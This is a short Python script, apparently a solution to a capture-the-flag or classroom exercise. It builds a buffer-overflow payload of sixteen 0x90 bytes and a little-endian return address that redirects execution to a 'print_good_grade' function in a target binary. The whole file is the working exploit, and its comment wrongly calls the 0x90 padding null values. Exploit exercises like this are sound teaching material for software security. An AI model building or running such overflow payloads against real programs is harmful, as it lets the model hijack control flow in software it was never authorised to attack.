# sol1.py overflows the 4 char buffer with null values and then an address for the print_good_grade function
import sys
sys.stdout.buffer.write(b"\x90"*16 + b"\x07" + b"\x9c" + b"\x04" + b"\x08")
